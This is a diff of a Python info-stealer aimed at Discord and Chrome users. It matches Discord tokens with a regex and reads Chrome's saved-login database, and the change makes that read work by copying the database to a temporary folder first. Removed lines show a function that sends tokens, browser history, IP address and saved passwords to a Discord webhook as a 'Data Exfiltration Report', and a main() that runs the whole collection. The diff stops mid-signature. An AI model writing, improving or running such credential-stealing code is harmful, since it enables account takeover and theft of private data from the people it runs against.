@@ -9,6 +9,8 @@ from pathlib import Path
 from datetime import datetime, timezone
 import platform
 import subprocess
+import shutil
+import tempfile
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"  # noqa: S105
 REQUEST_HEADERS = {
@@ -171,102 +173,32 @@ def get_saved_passwords() -> list[tuple[str, str, str]]:
     if not login_data_path.exists():
         return [("Error", "Login Data file not found", "")]
 
-    try:
-        conn = sqlite3.connect(str(login_data_path))
-        cursor = conn.cursor()
+    # Create a temporary directory
+    with tempfile.TemporaryDirectory() as temp_dir:
+        temp_login_data_path = Path(temp_dir) / "Login Data"
 
-        cursor.execute("""
-            SELECT origin_url, username_value, password_value
-            FROM logins
-        """)
+        try:
+            # Copy the Login Data file to the temporary directory
+            shutil.copy2(login_data_path, temp_login_data_path)
 
-        passwords = []
-        for origin_url, username_value, password_value in cursor.fetchall():
-            # The password_value is stored encrypted; decryption is complex and beyond the scope of this example
-            passwords.append((origin_url, username_value, "Encrypted Password"))
+            conn = sqlite3.connect(str(temp_login_data_path))
+            cursor = conn.cursor()
 
-        conn.close()
-        return passwords
-    except Exception as e:
-        return [("Error", f"Could not read login data: {e}", "")]
+            cursor.execute("""
+                SELECT origin_url, username_value, password_value
+                FROM logins
+            """)
+
+            passwords = []
+            for origin_url, username_value, password_value in cursor.fetchall():
+                # The password_value is stored encrypted; decryption is complex and beyond the scope of this example
+                passwords.append((origin_url, username_value, "Encrypted Password"))
+
+            conn.close()
+            return passwords
+        except Exception as e:
+            return [("Error", f"Could not read login data: {e}", "")]
 
 
 def send_data_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]], ip_address: str, history: list[tuple[str, str, datetime]], passwords: list[tuple[str, str, str]]
-) -> int:
-    """Sends collected data to a Discord webhook.
-
-    Args:
-        webhook_url (str): The URL of the Discord webhook.
-        user_id_to_token (dict[str, set[str]]): A dictionary mapping user IDs to their tokens.
-        ip_address (str): The IP address of the machine.
-        history (list[tuple[str, str, datetime]]): A list of browser history entries.
-        passwords (list[tuple[str, str, str]]): A list of saved passwords.
-
-    Returns:
-        int: The HTTP status code of the webhook request.
-    """
-
-    fields = []
-
-    # Add tokens
-    for user_id, tokens in user_id_to_token.items():
-        fields.append({
-            "name": f"Tokens for {user_id}",
-            "value": "\n".join(tokens),
-        })
-
-    # Add browser history
-    history_str = ""
-    for url, title, visit_time in history:
-        history_str += f"URL: {url}\nTitle: {title}\nVisited: {visit_time}\n\n"
-
-    fields.append({
-        "name": "Browser History (Last 10)",
-        "value": history_str if history_str else "No history found",
-    })
-
-    # Add saved passwords
-    passwords_str = ""
-    for origin_url, username_value, password_value in passwords:
-        passwords_str += f"URL: {origin_url}\nUsername: {username_value}\nPassword: {password_value}\n\n"
-
-    fields.append({
-        "name": "Saved Passwords",
-        "value": passwords_str if passwords_str else "No saved passwords found",
-    })
-
-    data = {
-        "content": f"Data Exfiltration Report. IP Address: {ip_address}",
-        "embeds": [{"fields": fields}],
-    }
-
-    return make_post_request(webhook_url, data)
-
-
-def main() -> None:
-    chrome_path = (
-        Path(os.getenv("LOCALAPPDATA")) /
-        "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb"
-    )
-    tokens = get_tokens_from_path(chrome_path)
-
-    if tokens is None:
-        print("No tokens found.")
-        tokens = {}  # Ensure tokens is an empty dictionary if no tokens are found
-
-    ip_address = get_ip_address()
-    print(f"IP Address: {ip_address}")
-
-    history = get_browser_history()
-    print("Browser History Retrieved.")
-
-    passwords = get_saved_passwords()
-    print("Saved Passwords Retrieved.")
-
-    status_code = send_data_to_webhook(WEBHOOK_URL, tokens, ip_address, history, passwords)
-    print(f"Webhook request status: {status_code}")
-
-
-if __name__ == "__main__":
-    main()
+    webhook_url: str
